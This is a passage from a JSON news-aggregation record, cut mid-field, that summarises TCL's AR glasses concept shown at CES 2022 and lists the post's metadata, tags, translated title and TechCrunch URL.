maker TCL is dabbling in the AR glasses space, pitching something akin to Google Glass in a package that looks much more like a standard pair of specs. \u201cHolographic optical waveguide technology\u201d pushes visuals onto the lens and into your field of view, and their concept video above promises touch-based controls built into the frames.", "posttime": "2022-01-10 00:18:39", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "ar,vr", "title": "VR\u548cAR\u7ee7\u7eed\u5728CES 2022\u7168", "title_en": "\n\t\t\t\tVR and AR continue to simmer at CES 2022\t\t\t", "transed": 1, "url": "https://techcrunch.com/2022/01/07/vr-and-ar-continue-to-simmer-at-ces-2022/", "via": "", "real_tags": ["ar", "vr"]}]
